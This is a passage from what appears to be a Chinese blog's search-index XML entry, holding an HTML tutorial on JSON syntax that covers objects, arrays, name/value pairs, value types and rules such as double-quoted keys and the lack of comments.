<strong>对象（Object）</strong></h3><p>一组键值对的集合，用大括号 <code>{}</code> 包围。键（key）必须是字符串，值（value）可以是字符串、数字、布尔值、数组、对象或null。</p><h3 id="2-1-2-数组（Array）"><a href="#2-1-2-数组（Array）" class="headerlink" title="2.1.2 数组（Array）"></a>2.1.2 <strong>数组（Array）</strong></h3><p>一组有序的值的集合，用方括号 <code>[]</code> 包围。数组中的元素可以是任意类型的数据。</p><p>中括号 <strong>[]</strong> 保存的数组是值（value）的有序集合。一个数组以左中括号 <strong>[</strong> 开始， 右中括号 <strong>]</strong> 结束，值之间使用逗号 <strong>,</strong> 分隔。</p><p>值（value）可以是双引号括起来的字符串（string）、数值(number)、true、false、 null、对象（object）或者数组（array），它们是可以嵌套的。</p><h2 id="2-3-JSON-名称-值对"><a href="#2-3-JSON-名称-值对" class="headerlink" title="2.3 JSON 名称/值对"></a>2.3 JSON 名称/值对</h2><p>JSON 数据的书写格式是：</p><pre class="line-numbers language-json" data-language="json"><code class="language-json">key <span class="token operator">:</span> value<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>键（在双引号中），后面写一个冒号，然后是值。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token string">"name"</span> <span class="token builtin class-name">:</span> <span class="token string">"sxk"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这很容易理解，等价于这条 JavaScript 语句：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">name <span class="token operator">=</span> <span class="token string">"sxk"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-4-JSON-值"><a href="#2-4-JSON-值" class="headerlink" title="2.4 JSON 值"></a>2.4 JSON 值</h2><ul><li><strong>字符串（String）</strong>：用双引号 <code>""</code> 包围的文本数据。单引号 <code>''</code> 不是有效的JSON字符串。【⚠️】</li><li><strong>数字（Number）</strong>：可以是整数或浮点数，可以使用科学计数法表示。</li><li><strong>布尔值（Boolean）</strong>：只有两个值：<code>true</code> 和 <code>false</code>，注意大小写。</li><li><strong>数组（Array）</strong>：用方括号 <code>[]</code> 包围的有序值集合。</li><li><strong>对象（Object）</strong>：用大括号 <code>{}</code> 包围的键值对集合。</li><li><strong>null</strong>：表示空值或不存在的值。</li></ul><p>语法要点：</p><h2 id="语法要点"><a href="#语法要点" class="headerlink" title="语法要点"></a>语法要点</h2><ul><li><strong>键必须是字符串</strong>：即使键看起来像是数字或布尔值，也必须用双引号包围。【⚠️】</li><li><strong>值可以是任意类型</strong>：包括字符串、数字、布尔值、数组、对象或null。</li><li><strong>逗号分隔</strong>：对象中的键值对或数组中的元素之间用逗号 <code>,</code> 分隔。</li><li><strong>不允许注释</strong>：JSON格式不支持注释，这与JavaScript不同。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 前后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JSON </tag>
            
            <tag> 前后端数据交换 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
